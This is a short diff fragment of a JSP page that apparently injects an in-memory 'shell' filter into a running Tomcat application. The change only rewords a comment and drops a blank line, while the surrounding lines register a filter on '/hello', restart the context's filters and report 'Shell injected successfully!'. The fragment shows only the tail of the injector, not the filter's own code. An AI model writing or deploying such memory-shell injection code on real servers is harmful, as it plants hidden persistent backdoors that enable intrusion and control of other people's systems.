@@ -59,13 +59,12 @@
             filterMap.addURLPattern("/hello");
             ctx3.addFilterMap(filterMap);
 
-            // Re-initialize the set of filters for this context
+            // Reinitialize the set of filters for this context
             ctx3.filterStart();
 
             response.getWriter().println("Shell injected successfully!");
         } catch (Exception e) {
             response.getWriter().println("Error injecting shell: " + e.getMessage());
         }
-
     }
 %>
